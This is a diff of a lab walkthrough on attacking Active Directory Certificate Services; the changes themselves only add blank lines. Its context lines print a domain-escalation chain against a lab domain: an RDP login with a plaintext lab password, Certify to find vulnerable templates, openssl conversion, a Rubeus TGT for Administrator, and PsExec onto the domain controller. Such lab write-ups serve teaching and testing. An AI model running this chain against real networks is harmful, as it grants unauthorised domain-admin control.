@@ -18,6 +18,7 @@ description: "Kerberos Ep.12 – Active Directory Certificate Services - A walkt
 # ![image2](../resources/c4da4ac2027b4e3a91982717374c9066.png)
 
 - RDP:
+
 ```bash
 xfreerdp /v:10.102.155.250 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard +drives /drive:root,/home/kali /dynamic-resolution
 
@@ -26,6 +27,7 @@ xfreerdp /v:10.102.155.250 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard 
 ![image3](../resources/a9a5876ac10240f8aad2da637531d87b.png)
 
 - Find vulnerable templates:
+
 ```bash
 .\Certify.exe find /vulnerable
 
@@ -54,6 +56,7 @@ Certify request /ca:\<Name of the CA retrieved previously\> /template:\<Name of 
 - Copy RSA key and Cert and paste in to Kali (cert.pem):
 
 - Run (Leave passwords blank):
+
 ```bash
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
@@ -70,6 +73,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 - Copy that file through the mounted drive to the Windows Desktop
 
 - Open Powershell:
+
 ```bash
 .\Rubeus.exe asktgt /certificate:cert.pfx /user:Administrator /ptt
 
@@ -81,6 +85,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 ![image13](../resources/10154dc0477d4a01b64822ffb0026a7f.png)
 
 - Now that you have a TGT for the administrator user, you can use PsExec to log in to the DC:
+
 ```bash
 .\PsExec64.exe \\dc01.krbtown.local cmd
 
